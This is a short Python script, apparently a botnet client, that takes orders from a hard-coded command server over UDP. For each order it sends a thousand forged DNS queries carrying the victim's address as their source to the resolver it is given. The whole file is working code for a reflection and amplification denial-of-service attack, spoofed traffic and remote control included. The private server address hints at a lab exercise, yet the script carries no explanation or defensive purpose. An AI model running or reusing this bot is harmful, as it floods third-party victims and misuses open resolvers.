from scapy.all import *
import socket

server_IP = "172.23.0.122"
server_port = 3001

client_bot_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
serv_addr = (server_IP, server_port)

client_bot_socket.connect(serv_addr)
client_bot_socket.send("hi\n".encode())
while True:
    data, _ = client_bot_socket.recvfrom(1024)
    string_data_splitted = data.decode().split('\n')
    assert len(string_data_splitted) >= 2
    target_IP = string_data_splitted[0]
    resolver_IP = string_data_splitted[1]
    query = string_data_splitted[2]
    request = IP(src=target_IP, dst=resolver_IP) / UDP(dport=53) / DNS(qd=DNSQR(qname=query))
    for _ in range(1000):
        send(request)